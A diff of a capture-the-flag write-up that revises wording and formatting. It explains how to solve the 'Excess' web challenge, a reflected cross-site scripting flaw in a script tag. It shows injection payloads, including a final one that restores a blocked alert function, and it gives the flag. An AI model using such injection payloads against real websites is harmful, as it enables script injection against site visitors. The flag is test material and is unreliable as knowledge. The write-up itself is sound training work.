@@ -1,14 +1,18 @@
 # Excess
 Category: `web`
+
 Description: `This is some kind of reverse captcha to tell if the visitor is indeed a robot. Can you complete it?`
+
 Service: `http://xss1.alieni.se:2999/`
+
 Author: `avlidienbrunn`
+
 Points: 51
 
-# How to Solve
+### How to Solve
 ![Main website](https://github.com/fionachang/ctf-writeups/raw/master/2018/security_fest/img/excess/main.png)
 
-The website provides a link to `http://xss1.alieni.se:2999/?xss=hello` but the link looks the same. Here is the page source:
+The website provides a link to `http://xss1.alieni.se:2999/?xss=hello` but the link looks the same as the website. Here is the page source:
 
 ```html
 <!DOCTYPE html>
@@ -62,23 +66,23 @@ The GET parameter `xss` controls the variable declared in a script tag in the pa
 <script>var x ='hello'; var y = `hello`; var z = "hello";</script>
 ```
 
-Browsing to `http://xss1.alieni.se:2999/?xss='; alert(1); '` shows a pop-up containing the sentences `He confirm. He alert. But most of all he prompt.` and a textbox instead.
+Browsing to `http://xss1.alieni.se:2999/?xss='; alert(1); '` shows a prompt instead.
 
 ![Initial payload](https://github.com/fionachang/ctf-writeups/raw/master/2018/security_fest/img/excess/initial_payload.png)
 
-The page source indicates that script was successfully injected.
+The page source indicates that the script was successfully injected.
 
 ```html
 <script>var x =''; alert(1); ''; var y = `'; alert(1); '`; var z = "'; alert(1); '";</script>
 ```
 
-After looking closely at the page source, there is a javascript file define before the payload.
+After looking closely at the page source, there is a javascript file defined before the payload.
 
 ```html
-<script src="/static/no_alert_for_you.js"></script><section class="login-info">
+<script src="/static/no_alert_for_you.js"></script>
 ```
 
-The file `no_alert_for_you.js` override the `window.alert` function to a prompt. Hence, a prompt is shown instead of the alert.
+The file `no_alert_for_you.js` overrides the `window.alert` function to a prompt.
 
 ```javascript
 /*
@@ -104,13 +108,15 @@ b'ger   /      (//   \\)     __/     /   \
 window.alert = (x=>prompt("He confirm. He alert. But most of all he prompt."));
 ```
 
-We have to restore `window.alert` to the default alert function. We can get the default alert function by referencing the alert function of another window. In this case, we are using the default alert function of a new window. _Note: You may need to enable pop-up_ 
+We can restore `window.alert` to the default alert function by using the alert function of another window. In this case, we are using the alert function of a new window.
+
+_Note: You may need to enable pop-up._ 
 
 ```javascript
 window.alert = window.open().alert;
 ```
 
-Using `alert(1)` will create a pop-up in the new window. Thus, we will use `window.alert(1)` so that a pop-up is created in the main window. Here is the final payload:
+Using `alert(1)` will create a pop-up in the new window. Thus, we will use `window.alert(1)` to create a pop-up in the main window instead. Here is the final payload:
 
 ```
 '; window.alert = window.open().alert; window.alert(1); '
@@ -128,4 +134,4 @@ Enter the link to get the flag.
 
 ![Flag](https://github.com/fionachang/ctf-writeups/raw/master/2018/security_fest/img/excess/flag.png)
 
-Flag: `sctf{cr0ss_s1te_n0scr1ptinG}`
+**Flag: `sctf{cr0ss_s1te_n0scr1ptinG}`**
